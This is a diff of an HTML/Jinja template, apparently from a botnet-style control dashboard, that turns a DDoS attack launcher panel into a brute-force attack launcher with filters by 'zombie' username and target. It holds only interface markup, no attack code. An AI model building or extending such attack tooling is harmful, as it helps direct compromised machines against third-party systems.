@@ -4,13 +4,13 @@
 
 {% block lateral_panel %}
 
-{% with data_type = 'dos', window_type = 'filter', filters=('task_type', 'created_at') %}
+{% with data_type = 'tasks', window_type = 'filter', filters=('zombie_username', 'created_at', 'target') %}
     {% include 'objects/windows/filter.html' %}
 {% endwith %}
 
 {% if data_filter.data %}
 
-  {% with data_type='dos', window_type = 'launcher', task_type=task_type, img_class = 'launcher-img-l', banner = 'img/genkidama.webp', icon = '🚦', panel_title = 'ddos attacK' %}
+  {% with data_type='brt', window_type = 'launcher', task_type=task_type, img_class = 'launcher-img-l', banner = 'img/wolfenstein.png', icon = '🎰', panel_title = 'bruteforce attacK' %}
     <div id="{{ data_type + '-launcher' }}" class="launcher-m">
       {% include 'objects/windows/attacks-launcher.html' %}
     </div>
@@ -33,14 +33,14 @@
 
 {% if data_filter.data %}
 
-  {% with data=data_filter.data, window_type = 'table-results', data_type = 'tasks', task_type = 'dos', data_buttons=True, scrollable_table=True, table_class='table-xl' %}
+  {% with data=data_filter.data, window_type = 'table-results', data_type = 'tasks', task_type = 'brt', data_buttons=True, scrollable_table=True, table_class='table-xl' %}
     {% include 'objects/windows/data-results.html' %}
   {% endwith %}
 
 
 {% else %}
 
-{% with data_type = 'ddos_attacks', banner = 'img/genkidama.webp', icon = '🚦', panel_title = 'ddos attacK' %}
+{% with data_type = 'tasks', task_type=task_type, banner = 'img/wolfenstein.png', icon = '🎰', panel_title = 'bruteforce attacK' %}
   {% include 'pages/dashboard/tools/base_attack.html' %}
 {% endwith %}
 
